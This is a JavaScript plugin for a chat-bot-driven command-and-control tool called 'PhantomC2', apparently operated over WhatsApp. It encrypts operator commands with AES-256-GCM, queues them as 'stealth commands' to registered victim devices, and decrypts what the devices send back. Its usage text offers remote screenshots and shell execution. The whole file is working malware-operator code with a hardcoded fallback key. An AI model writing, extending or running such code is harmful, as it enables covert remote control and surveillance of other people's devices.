import crypto from 'crypto';

const ALGO = 'aes-256-gcm';
const KEY_PASS = process.env.CRYPTO_KEY || 'PhantomC2!DefaultChangeMe_2026';
const SALT = 'PhantomC2Salt_v1';

function deriveKey() {
  return crypto.pbkdf2Sync(KEY_PASS, SALT, 120000, 32, 'sha256');
}

function encrypt(plaintext) {
  const key = deriveKey();
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv(ALGO, key, iv, { authTagLength: 16 });
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, encrypted, tag]).toString('base64');
}

function decrypt(encoded) {
  const raw = Buffer.from(encoded, 'base64');
  const iv = raw.subarray(0, 12);
  const tag = raw.subarray(raw.length - 16);
  const ct = raw.subarray(12, raw.length - 16);
  const key = deriveKey();
  const decipher = crypto.createDecipheriv(ALGO, key, iv, { authTagLength: 16 });
  decipher.setAuthTag(tag);
  return decipher.update(ct) + decipher.final('utf8');
}

export default {
  name: 'crypt',
  commands: ['crypt', 'encrypt', 'decrypt', 'c2'],
  handler: async (ctx) => {
    const { sock, jid, cmd, args, getDevices, queueCommand } = ctx;

    switch (cmd) {
      case 'c2': {
        // !c2 <command> [args] — encrypt and queue to device
        const target = getDevices()[0];
        if (!target) return await sock.sendMessage(jid, { text: '❌ No devices registered.' });
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!c2*\nEncrypt and queue stealth command.\nUsage: `!c2 screenshot`\nUsage: `!c2 shell ls -la`' });
        const plaintext = args;
        const encrypted = encrypt(plaintext);
        const id = queueCommand(target.device_id, 'c2', encrypted);
        await sock.sendMessage(jid, { text: `🛡️ *Stealth command queued*\n\`${plaintext}\` → \`${target.device_id}\` (#${id})\n\nEncrypted: \`${encrypted}\`` });
        break;
      }

      case 'crypt':
      case 'encrypt': {
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!encrypt <text>*\nEncrypt text for C2 transport.\nReturns base64 blob you can send as \`!c2 <blob>\`' });
        try {
          const result = encrypt(args);
          await sock.sendMessage(jid, { text: `🔒 *Encrypted*\n\n\`${result}\`` });
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ Encrypt error: ${e.message}` });
        }
        break;
      }

      case 'decrypt': {
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!decrypt <base64>*\nDecrypt a C2 response (starts with 🔒).\nPaste the base64 after the 🔒.' });
        try {
          const result = decrypt(args.trim());
          await sock.sendMessage(jid, { text: `🔓 *Decrypted*\n\n${result}` });
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ Decrypt error: ${e.message}\nMake sure you only paste the base64 (after 🔒).` });
        }
        break;
      }
    }
  }
};
